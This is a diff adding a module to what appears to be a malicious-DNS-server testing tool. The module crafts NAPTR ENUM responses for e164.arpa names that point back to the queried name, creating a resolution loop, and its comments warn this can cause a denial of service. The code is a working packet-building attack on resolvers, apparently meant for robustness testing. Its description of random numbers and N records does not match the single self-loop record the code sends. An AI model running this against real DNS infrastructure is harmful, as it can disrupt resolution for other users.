@@ -1,0 +1,48 @@
+[module]
+name = "nptenumloop"
+type = "feature"
+info = "NAPTR ENUM alias loop"
+desc = "Respond with N number of NAPTR ENUM records containing random E.164 phone numbers (aliases) in SIP service URI. BEWARE: This could result in multiplication."
+author = "ivan.jedek@oryxlabs.com"
+category = "Aliases, loops and chains"
+
+code = '''
+           elif req.first_subdomain == "2" and req.full_domain.endswith(".e164.arpa"):
+              # Requesting to translate an E.164 telephone number ending with the digit 2 (e.g., a NAPTR
+              # record for 2.<anything>.e164.arpa in reverse). The response will be a SIP service URI
+              # pointing to the same exact E.164 telephone number, effectively creating a direct loop.
+              # While NAPTR ENUM records do not contain aliases like CNAME records, this could achieve
+              # similar results by prompting the client to perform consecutive queries to resolve it.
+              # BEWARE: This could potentially lead to a domain lock-up (DoS)
+
+              ### DNS header ########
+              buffer = prep_dns_header(b'\x84\x00', req.QURR, 1, 0, 0)
+              ### QUESTION SECTION ########
+              if resp.noq: buffer += convDom2Bin(req.full_domain) + req.type_bin + req.class_bin
+              ### ANSWER SECTION ########
+              order       = 0
+              pref        = 0
+              flags       = b'U'          # Flags = "U" (URI)
+              service     = b'E2U+sip'    # Service = SIP
+              regex       = bytes("!^.*$!" + req.full_domain + "!", "utf-8")
+              replacement = b'\x00'
+
+              data_len = 2+2+1+len(flags)+1+len(service)+1+len(regex)+len(replacement)
+              buffer += b'\xc0\x0c' if resp.compress else convDom2Bin(req.full_domain)  ## Name
+              buffer += getTypeBin("NAPTR") + getClassBin("IN")
+              buffer += struct.pack(">L", resp.TTL)     ## TTL
+              buffer += struct.pack(">H", data_len)     ## Data length (2B)
+              buffer += struct.pack(">H", order)        ## Order (2B)
+              buffer += struct.pack(">H", pref)         ## Preference (2B)
+              buffer += struct.pack(">B", len(flags))   ## Flags Length (1B)
+              buffer += flags                           ## Flags
+              buffer += struct.pack(">B", len(service)) ## Service Length (1B)
+              buffer += service                         ## Service
+              buffer += struct.pack(">B", len(regex))   ## Regex Length (1B)
+              buffer += regex                           ## Regex
+              buffer += replacement                     ## Replacement
+              # log and send
+              log("NAPTR ENUM loop %s" % (req.full_domain))
+              send_buf(self, buffer)
+              #####################################################################
+'''
